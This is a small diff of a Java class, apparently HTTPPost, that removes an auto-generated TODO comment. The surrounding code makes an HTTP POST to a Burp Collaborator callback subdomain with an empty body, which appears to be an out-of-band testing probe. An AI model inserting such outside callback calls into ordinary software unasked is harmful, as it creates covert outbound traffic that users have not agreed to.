@@ -46,7 +46,6 @@ public class HTTPPost {
 		try {
 			httpPostRequest("http://dyfk9vxc9wug4nynx6hr24pjya40sp.burpcollaborator.net","");
 		} catch (IOException e) {
-			// TODO Auto-generated catch block
 			e.printStackTrace();
 		}
 	}
